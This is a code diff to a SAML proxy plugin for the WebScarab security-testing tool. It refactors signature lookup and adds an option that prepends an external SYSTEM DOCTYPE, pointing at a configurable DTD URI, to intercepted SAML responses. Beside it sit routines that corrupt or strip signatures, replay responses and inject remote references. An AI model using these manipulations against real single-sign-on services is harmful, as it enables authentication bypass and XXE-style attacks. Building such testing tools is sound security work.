@@ -58,7 +58,6 @@ import org.owasp.webscarab.model.Response;
 import org.owasp.webscarab.util.Encoding;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
-import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
 
@@ -108,8 +107,11 @@ public class SamlHTTPClient implements HTTPClient {
         if (this.samlProxyConfig.doInjectSubject()) {
             samlProxyHeader += "injected subject;";
         }
+        if (this.samlProxyConfig.doInjectPublicDoctype()) {
+            samlProxyHeader += "injected public doctype;";
+        }
 
-        if (samlProxyHeader.length() == 0) {
+        if (false == samlProxyHeader.isEmpty()) {
             request.addHeader("X-SAMLProxy", samlProxyHeader);
         }
 
@@ -174,6 +176,10 @@ public class SamlHTTPClient implements HTTPClient {
                     String newSamlResponse = injectSubject(namedValues[idx].getValue());
                     namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
                 }
+                if (this.samlProxyConfig.doInjectPublicDoctype()) {
+                    String newSamlResponse = injectPublicDoctype(namedValues[idx].getValue());
+                    namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
+                }
             } catch (Exception ex) {
                 this._logger.log(Level.WARNING, "could not corrupt the SAML Response signature: {0}", ex.getMessage());
                 continue;
@@ -199,13 +205,13 @@ public class SamlHTTPClient implements HTTPClient {
     private String corruptSamlResponseSignature(String samlResponse) throws TransformerConfigurationException, TransformerException, IOException, ParserConfigurationException, SAXException, Base64DecodingException {
         Document document = parseDocument(samlResponse);
 
-        Element signatureElement = findSignatureElement(document);
-        if (null == signatureElement) {
+        Element protocolSignatureElement = SamlModel.findProtocolSignatureElement(document);
+        if (null == protocolSignatureElement) {
             this._logger.warning("no XML signature found");
             return samlResponse;
         }
 
-        NodeList referenceNodeList = signatureElement.getElementsByTagNameNS("http://www.w3.org/2000/09/xmldsig#", "Reference");
+        NodeList referenceNodeList = protocolSignatureElement.getElementsByTagNameNS("http://www.w3.org/2000/09/xmldsig#", "Reference");
         if (0 == referenceNodeList.getLength()) {
             this._logger.warning("no XMLDSig Reference element present");
             return samlResponse;
@@ -226,11 +232,11 @@ public class SamlHTTPClient implements HTTPClient {
 
     private String removeSamlResponseSignature(String samlResponse) throws IOException, ParserConfigurationException, SAXException, TransformerConfigurationException, TransformerException, Base64DecodingException {
         Document document = parseDocument(samlResponse);
-        Element signatureElement = findSignatureElement(document);
-        if (null == signatureElement) {
+        Element protocolSignatureElement = SamlModel.findProtocolSignatureElement(document);
+        if (null == protocolSignatureElement) {
             return samlResponse;
         }
-        signatureElement.getParentNode().removeChild(signatureElement);
+        protocolSignatureElement.getParentNode().removeChild(protocolSignatureElement);
 
         return outputDocument(document);
     }
@@ -257,26 +263,6 @@ public class SamlHTTPClient implements HTTPClient {
         return document;
     }
 
-    private Element findSignatureElement(Document document) {
-        Element documentElement = document.getDocumentElement();
-        NodeList documentChildNodes = documentElement.getChildNodes();
-        int documentNodeCount = documentChildNodes.getLength();
-        for (int nodeIdx = 0; nodeIdx < documentNodeCount; nodeIdx++) {
-            Node node = documentChildNodes.item(nodeIdx);
-            if (Node.ELEMENT_NODE == node.getNodeType()) {
-                Element element = (Element) node;
-                if (false == "http://www.w3.org/2000/09/xmldsig#".equals(element.getNamespaceURI())) {
-                    continue;
-                }
-                if (false == "Signature".equals(element.getLocalName())) {
-                    continue;
-                }
-                return element;
-            }
-        }
-        return null;
-    }
-
     private String replaySamlResponse() {
         String replayedSamlResponse = this.samlProxyConfig.getReplaySamlResponse();
         return replayedSamlResponse;
@@ -285,20 +271,20 @@ public class SamlHTTPClient implements HTTPClient {
     private String injectRemoteReference(String samlResponse) throws IOException, ParserConfigurationException, SAXException, Base64DecodingException, TransformerConfigurationException, TransformerException {
         Document document = parseDocument(samlResponse);
 
-        Element signatureElement = findSignatureElement(document);
-        if (null == signatureElement) {
+        Element protocolSignatureElement = SamlModel.findProtocolSignatureElement(document);
+        if (null == protocolSignatureElement) {
             this._logger.warning("no XML signature found");
             return samlResponse;
         }
 
-        NodeList signedInfoNodeList = signatureElement.getElementsByTagNameNS("http://www.w3.org/2000/09/xmldsig#", "SignedInfo");
+        NodeList signedInfoNodeList = protocolSignatureElement.getElementsByTagNameNS("http://www.w3.org/2000/09/xmldsig#", "SignedInfo");
         if (0 == signedInfoNodeList.getLength()) {
             this._logger.warning("no SignedInfo present in XML signature");
             return samlResponse;
         }
         Element signedInfoElement = (Element) signedInfoNodeList.item(0);
 
-        String namespacePrefix = signatureElement.getPrefix();
+        String namespacePrefix = protocolSignatureElement.getPrefix();
         if (null == namespacePrefix) {
             namespacePrefix = "";
         } else {
@@ -378,5 +364,13 @@ public class SamlHTTPClient implements HTTPClient {
         }
 
         return outputDocument(document);
+    }
+
+    private String injectPublicDoctype(String samlResponse) throws Base64DecodingException {
+        String dtdUri = this.samlProxyConfig.getDtdUri();
+        byte[] decodedSamlResponse = Base64.decode(Encoding.urlDecode(samlResponse));
+        String newDecodedSamlResponse = "<!DOCTYPE SomeElement SYSTEM \"" + dtdUri + "\">" + new String(decodedSamlResponse);
+        String newSamlResponse = Encoding.urlEncode(Base64.encode(newDecodedSamlResponse.getBytes()));
+        return newSamlResponse;
     }
 }
